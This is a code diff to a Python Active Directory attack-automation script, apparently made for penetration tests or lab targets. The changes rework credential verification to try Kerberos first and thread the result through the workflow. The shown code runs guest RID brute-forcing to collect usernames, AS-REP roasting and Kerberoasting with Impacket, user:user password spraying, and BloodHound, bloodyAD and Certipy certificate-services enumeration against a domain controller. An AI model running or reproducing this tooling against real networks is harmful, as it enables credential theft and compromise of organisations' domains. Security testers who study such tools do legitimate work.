@@ -35,7 +35,7 @@ def print_status(message):
 
 def print_header(title):
     """Prints a formatted section header."""
-    print(colored("\n\n\n" + "="*50, "blue"))
+    print(colored("\n" + "="*50, "blue"))
     print(colored(f"{title}", "white"))
     print(colored("="*50, "blue"))
 
@@ -83,41 +83,98 @@ def run_command(cmd_list_or_str, title, is_shell_command=False, capture_output=F
         return None, result.returncode
 
 
-def verify_credentials(r, username, password, timeout=20):
+def verify_credentials(r, username, password, fqdn=None, domain=None, timeout=20):
     """
-    Lightweight SMB credential check. Returns True if creds look valid,
-    False otherwise. Prints a clear message explaining the result.
+    Kerberos-first credential verification.
+
+    Behavior:
+      - If fqdn+domain provided, run a GetUserSPNs.py probe first to detect NTLM-negotiation-failure
+        (which implies Kerberos-only). If probe indicates Kerberos, return "kerberos".
+      - If probe indicates explicit success -> return "ok".
+      - If probe indicates invalid creds -> return "bad".
+      - Otherwise fall back to nxc smb NTLM probe:
+          - explicit success -> "ok"
+          - explicit logon failure -> "bad"
+          - Kerberos/negotiation hints -> "kerberos"
+          - ambiguous/no output -> "ambiguous"
+      - If username/password not provided -> "no-creds"
+
+    Return values: "kerberos", "ok", "bad", "ambiguous", "no-creds"
     """
     if not username or not password:
-        # Nothing to verify
-        return False
+        return "no-creds"
 
-    print_status("\n[*] Verifying provided credentials before continuing...")
+    print_status("\n[*] Verifying provided credentials before continuing (Kerberos-first)...")
 
-    # Use run_command so output is shown the same way your script does
-    # Capture output so we can inspect it
-    out, rc = run_command(["nxc", "smb", r, "-u", username, "-p", password, "--shares"],
-                          "Verify provided credentials",
-                          capture_output=True)
+    # 1) Kerberos-capable probe using GetUserSPNs.py when we have fqdn+domain
+    if fqdn and domain:
+        try:
+            krb_cmd = [
+                "GetUserSPNs.py",
+                f"{domain}/{username}:{password}",
+                "-request",
+                "-dc-host",
+                fqdn
+            ]
+            out, rc = run_command(krb_cmd, "Kerberos-capable probe (GetUserSPNs.py)", capture_output=True)
+            text = (out or "").strip()
 
-    # If we see an explicit success marker, credentials are valid
-    if out and re.search(r'\[\+\]|Authenticated', out, re.IGNORECASE):
-        print_status(colored("\n[+] Credentials validated (SMB authentication succeeded). Continuing.", "green"))
-        return True
+            if text:
+                # If the Impacket message says NTLM negotiation failed -> Kerberos needed
+                if re.search(r'NTLM negotiation failed|NTLM is disabled|Try to use Kerberos|invalidCredentials', text, re.IGNORECASE):
+                    print_status("\n[!] KERBEROS RERUN DETECTED: NTLM negotiation failed (GetUserSPNs probe).")
+                    return "kerberos"
 
-    # If we see a clear logon failure, treat as invalid
-    if out and re.search(r'STATUS_LOGON_FAILURE', out, re.IGNORECASE):
-        print_status(colored("\n[-] Provided credentials failed SMB authentication (STATUS_LOGON_FAILURE).", "red"))
-        return False
+                # If GetUserSPNs shows explicit success or ticket-related output -> OK
+                if re.search(r'\[\+\]|Authenticated|Requested TGS|TGS issued|Ticket', text, re.IGNORECASE):
+                    print_status("\n[+] GetUserSPNs probe shows success/response — credentials look OK.")
+                    return "ok"
 
-    # If the output is present but ambiguous, fail-safe: treat as invalid
-    if out and out.strip():
-        print_status(colored("\n[-] Credential verification returned ambiguous result; stopping.", "red"))
-        return False
+                # If GetUserSPNs returned explicit invalid credentials -> bad
+                if re.search(r'invalidCredentials|STATUS_LOGON_FAILURE|NT_STATUS_LOGON_FAILURE', text, re.IGNORECASE):
+                    print_status("\n[-] GetUserSPNs probe indicates credentials are invalid (invalidCredentials / STATUS_LOGON_FAILURE).")
+                    return "bad"
 
-    # No output at all — treat as failure (tool might be flaky)
-    print_status(colored("\n[-] No output from credential verification — treating as failure and stopping.", "red"))
-    return False
+                # Ambiguous from GetUserSPNs -> fall through to SMB check
+                print_status("\n[!] GetUserSPNs probe ambiguous — falling back to NTLM-style SMB probe.")
+            else:
+                print_status("\n[!] GetUserSPNs produced no useful output — falling back to NTLM-style SMB probe.")
+        except Exception as e:
+            print_status(f"\n[!] Failed to run GetUserSPNs probe: {e}. Falling back to NTLM-style SMB probe.")
+
+    # 2) Fallback: run nxc smb check
+    try:
+        smb_cmd = ["nxc", "smb", r, "-u", username, "-p", password]
+        out, rc = run_command(smb_cmd, "Verify provided credentials (nxc smb check)", capture_output=True)
+        text = (out or "").strip()
+
+        if not text:
+            print_status("\n[-] No output from nxc smb probe; treating as ambiguous.")
+            return "ambiguous"
+
+        # explicit success markers
+        if re.search(r'\[\+\]|Authenticated|STATUS_SUCCESS', text, re.IGNORECASE):
+            print_status("\n[+] Credentials validated (SMB authentication succeeded).")
+            return "ok"
+
+        # Kerberos / negotiation hints in SMB output
+        if re.search(r'STATUS_NOT_SUPPORTED|KDC_ERR|SPNEGO|NTLM negotiation failed', text, re.IGNORECASE):
+            print_status("\n[+] Kerberos/negotiation detected in SMB output — recommend Kerberos flows.")
+            return "kerberos"
+
+        # explicit failures
+        if re.search(r'STATUS_LOGON_FAILURE|NT_STATUS_LOGON_FAILURE|authentication failed', text, re.IGNORECASE):
+            print_status("\n[-] Provided credentials failed SMB authentication (STATUS_LOGON_FAILURE).")
+            return "bad"
+
+        # ambiguous but non-empty output
+        print_status("\n[!] Credential verification returned ambiguous result; treating as ambiguous.")
+        return "ambiguous"
+
+    except Exception as e:
+        print_status(f"\n[!] Exception during SMB credential probe: {e}")
+        return "ambiguous"
+
 
 
 # Check Dependencies 
@@ -298,7 +355,7 @@ def update_users_file(new_unique, USERS_FILE, print_status_func):
                 for name in to_add_originals:
                     ef.write(name + "\n")
             
-            print_status_func(f"[+] {action} {len(to_add_originals)} new username(s) to {USERS_FILE}.")
+            print_status_func(f"[+] {action} new username(s) to {USERS_FILE}.")
         except Exception as e:
             print_status_func(f"[-] Error {action.lower()} to {USERS_FILE}: {e}")
     else:
@@ -426,7 +483,7 @@ def section_1_ldap_discovery(r, u, p, k):
             seen_new.add(nl)
             new_unique.append(n)
 
-        print_status(f"[+] Found {len(new_unique)} unique usernames from LDAP.")
+        print_status(f"[+] Found unique usernames from LDAP.")
         update_users_file(new_unique, USERS_FILE, print_status)
     else:
         print_status("[*] No usernames discovered via LDAP username extraction.")
@@ -460,15 +517,17 @@ def section_2_smb_enum(r, f, d, u, p, k):
             run_command(["nxc", "smb", f, "-u", u, "-p", p, "-k", "--shares"], "Enumerate SMB shares (Kerberos with nxc)")
 
             # Get Kerberos TGT (This tool requires the password, but FQDN positional argument is REMOVED)
+            # 2) Try to obtain a TGT with getTGT.py (Impacket will drop a <user>.ccache file on success)
             run_command(["getTGT.py", f"{d}/{u}:{p}", "-dc-ip", r], "Get Kerberos TGT with getTGT.py")
 
-            # Give smbclient.py command to run
+            # 3) If getTGT.py produced a cache file, export it in this script's environment
             if os.path.exists(ccache_file):
-                cmd_str = f"KRB5CCNAME={ccache_file} smbclient.py -k {f}/"
-                
-                print(colored(f"\n Connect to SMB using Kerberos ticket ", 'blue'))
+                os.environ["KRB5CCNAME"] = ccache_file
+                print_status(f"[+] Found TGT cache {ccache_file} and exported KRB5CCNAME.")
+                cmd_str = f"KRB5CCNAME={ccache_file} smbclient.py -k {f}"
+                print(colored(f"\nConnect to SMB using Kerberos ticket", 'blue'))
                 print_status(f"[+] EXECUTABLE COMMAND: {cmd_str}")
-                print_status("[*] Note: You will need to run this command manually in a new shell where the ticket is available.")
+                print_status("[*] Note: You can run the command above in a shell, or subsequent run_command() calls in this script will inherit KRB5CCNAME.")
             else:
                 print_status(f"[-] ERROR: Kerberos ticket file '{ccache_file}' not found after getTGT.py.")
             
@@ -500,7 +559,7 @@ def section_2_smb_enum(r, f, d, u, p, k):
             run_command(["nxc", "smb", r, "-u", "guest", "-p", "''", "--rid-brute", "5000", "--users-export", USERS_FILE], "RID Brute-Force to create user list (Guest)")
 
         else:
-            print_status(f"\n\n[-] User file '{USERS_FILE}' already exists, skipping initial RID brute-force.")
+            print_status(f"\n\n[*] User file '{USERS_FILE}' already exists, skipping initial RID brute-force.")
    
 
 
@@ -569,42 +628,41 @@ def try_user_user_file(file_path, target, note="Try user:user", timeout=30):
     print_status("\n[+] User:user spray finished.")
 
 
-def section_3_user_spraying(r, d, u=None, p=None):
+def section_3_user_spraying(r, d, u=None, p=None, cred_status=None):
     """
-    User Spraying (AS-REP Roasting)
-    - If no credentials provided (u and p are both empty/None), run user:user spraying.
-    - If credentials provided, *verify them first*; only run GetNPUsers.py if creds validated.
+    cred_status can be:
+      "no-creds", "ok", "kerberos", "bad", "ambiguous"
+    If cred_status is provided we won't re-run the SMB verify inside this function.
     """
     print_header("3. User Spraying (AS-REP Roasting)")
 
-    # If credentials provided, verify them first before running Kerberos-related tools
+    # If creds provided, use the cred_status passed from main()
     if u and p:
-        print_status("\n[INFO] Credentials provided — verifying credentials before Kerberos/AS-REP checks...")
+        if cred_status is None:
+            # fallback if main didn't verify: run lightweight verification (existing behavior)
+            verify_cmd = ["nxc", "smb", r, "-u", u, "-p", p, "--shares"]
+            out, _ = run_command(verify_cmd, "Verify provided credentials (light SMB check)", capture_output=True)
+            if out and re.search(r'STATUS_LOGON_FAILURE', out, re.IGNORECASE):
+                print_status(colored("\n[-] Provided credentials appear invalid (STATUS_LOGON_FAILURE).", "red"))
+                print_status(colored("[-] Skipping GetNPUsers.py and Kerberos AS-REP checks due to invalid credentials.", "red"))
+                return
+            if out and re.search(r'\[\+\]|Authenticated', out, re.IGNORECASE):
+                cred_status = "ok"
+            else:
+                cred_status = "ambiguous"
 
-        # Run a lightweight SMB auth test (capture output)
-        verify_cmd = ["nxc", "smb", r, "-u", u, "-p", p, "--shares"]
-        out, _ = run_command(verify_cmd, "Verify provided credentials (light SMB check)", capture_output=True)
-
-        # If we saw an explicit SMB logon failure, skip Kerberos/AS-REP activity
-        if out and re.search(r'STATUS_LOGON_FAILURE', out, re.IGNORECASE):
-            print_status(colored("\n[-] Provided credentials appear invalid (STATUS_LOGON_FAILURE).", "red"))
-            print_status(colored("[-] Skipping GetNPUsers.py and Kerberos AS-REP checks due to invalid credentials.", "red"))
+        # Now react to the known cred_status (do not re-run the check)
+        if cred_status == "bad":
+            print_status(colored("\n[-] Provided credentials invalid — skipping AS-REP checks.", "red"))
             return
-
-        # If we see explicit success markers, proceed
-        if out and re.search(r'\[\+\]|Authenticated', out, re.IGNORECASE):
-            print_status(colored("\n[+] Credentials validated (SMB authentication succeeded). Proceeding with AS-REP checks.", "green"))
-        else:
-            # If output is empty or ambiguous, warn and proceed cautiously
-            print_status(colored("\n[!] Credential verification returned ambiguous/no output. Proceeding with AS-REP checks (you can disable by supplying no creds).", "yellow"))
-
-        # At this point: credentials seem OK (or user accepted risk) -> run GetNPUsers.py
-        if os.path.exists(USERS_FILE):
-            cmd_str = f"GetNPUsers.py {d}/ -no-pass -usersfile {USERS_FILE} -dc-ip {r} | grep -v 'KDC_ERR_C_PRINCIPAL_UNKNOWN'"
-            run_command(cmd_str, "Find users with Kerberos pre-auth disabled", is_shell_command=True)
-        else:
-            print_status(f"\n[INFO] '{USERS_FILE}' not found — skipping AS-REP Roasting.")
-        return
+        elif cred_status in ("ok", "kerberos", "ambiguous"):
+            # proceed with AS-REP checks (same behavior you had)
+            if os.path.exists(USERS_FILE):
+                cmd_str = f"GetNPUsers.py {d}/ -no-pass -usersfile {USERS_FILE} -dc-ip {r} | grep -v 'KDC_ERR_C_PRINCIPAL_UNKNOWN'"
+                run_command(cmd_str, "Find users with Kerberos pre-auth disabled", is_shell_command=True)
+            else:
+                print_status(f"\n[INFO] '{USERS_FILE}' not found — skipping AS-REP Roasting.")
+            return
 
     # No creds -> proceed with spraying (but only if users.txt exists)
     if not os.path.exists(USERS_FILE):
@@ -752,11 +810,6 @@ def main():
 
     args.kerberos = False
 
-    if args.username and args.password:
-            ok = verify_credentials(args.rhosts, args.username, args.password)
-            if not ok:
-                print_status(colored("\n[-] Stopping: invalid credentials supplied. Fix credentials or rerun without them to continue anonymous checks.", "red"))
-                sys.exit(1)
     # Rerun Loop Setup 
     run_authenticated_checks = True
 
@@ -791,7 +844,21 @@ def main():
         
         check_dependencies()
 
-        # A. PFX Certificate Scan (Priority Check) 
+        # 1) If creds provided, run Kerberos-first verification NOW (this sets args.kerberos when needed)
+        cred_status = "no-creds"
+        if args.username and args.password:
+            cred_status = verify_credentials(args.rhosts, args.username, args.password, fqdn=args.fqdn, domain=args.domain)
+            if cred_status == "kerberos":
+                args.kerberos = True
+                print_status("[+] Enabling Kerberos for subsequent checks (detected from probe).")
+            elif cred_status == "bad":
+                print_status("\n[-] Stopping: invalid credentials supplied. Fix credentials or rerun without them to continue anonymous checks.")
+                sys.exit(1)
+            elif cred_status == "ambiguous":
+                print_status("\n[!] Credential verification ambiguous — proceeding but be cautious; you can rerun without creds for anonymous checks.")
+        
+
+        # 2) PFX Certificate Scan (Priority) - still honored; requires username + pfx-pass
         if args.pfx_cert:
             if args.username and args.pfx_pass:
                 section_8_adcs_pfx_scan(args.rhosts, args.username, args.pfx_cert, args.pfx_pass)
@@ -799,7 +866,7 @@ def main():
                 print_status("\n[!] PFX scan requires a username (--username) and PFX password (--pfx-pass).")
             break
 
-        # B. LDAP Discovery (Always Runs) 
+        # 3) LDAP Discovery (Always Runs)
         discovered_domain, discovered_fqdn = section_1_ldap_discovery(
             args.rhosts, args.username, args.password, args.kerberos
         )
@@ -808,40 +875,39 @@ def main():
         if discovered_domain: args.domain = discovered_domain
         if discovered_fqdn: args.fqdn = discovered_fqdn
 
+        # 4) SMB Enumeration
         section_2_smb_enum(args.rhosts, args.fqdn, args.domain, args.username, args.password, args.kerberos)
 
+        # 5) User Spraying / AS-REP Roasting
         if args.domain:
-            section_3_user_spraying(args.rhosts, args.domain, args.username, args.password)
+            section_3_user_spraying(args.rhosts, args.domain, args.username, args.password, cred_status=cred_status)
         else:
             print_status("\n[!] Skipping User Spraying (AS-REP Roasting), as it requires domain discovery.")
 
-        # C. Authenticated Checks (The Rerun Block) 
+        # 6) Authenticated-only follow-ups
         if not args.username or not args.password:
-            print_status("\n[INFO] No credentials provided. Skipping authenticated checks.")
-
+            print_status("\n[*] No credentials provided. Skipping authenticated checks.")
         elif not args.domain or not args.fqdn:
             print_status("\n[!] Skipping advanced authenticated checks, as they require discovered domain and fqdn.")
-
         else:
-            # Kerberoasting (Check for NTLM failure here) 
+            # Kerberoasting (this can flip to Kerberos if NTLM fails later)
             rerun_kerberos = section_4_kerberoasting(
                 args.rhosts, args.fqdn, args.domain, args.username, args.password, args.kerberos
             )
 
             if rerun_kerberos and not args.kerberos:
-                # Rerun Logic Triggered
                 print_status("\n[!] NTLM negotiation failed. Switching to Kerberos for all subsequent commands.")
                 args.kerberos = True
                 run_authenticated_checks = True
-                print_status("[!] Restarting Enumeration with Kerberos Enabled")
+                print_status("[*] RESTARTING ENUMERATION WITH KERBEROS ENABLED [*]")
                 continue
 
-            # Only continue with these sections if NOT rerunning 
+            # Continue with remaining authenticated tasks
             section_5_bloodhound(args.rhosts, args.fqdn, args.domain, args.username, args.password, args.kerberos)
             section_6_bloodyad(args.rhosts, args.username, args.password, args.kerberos, args.domain, args.fqdn)
             section_7_adcs_certipy(args.rhosts, args.fqdn, args.domain, args.username, args.password, args.kerberos)
 
     print_status("\n[+] Enumeration script finished.\n")
-
+    
 if __name__ == "__main__":
     main()
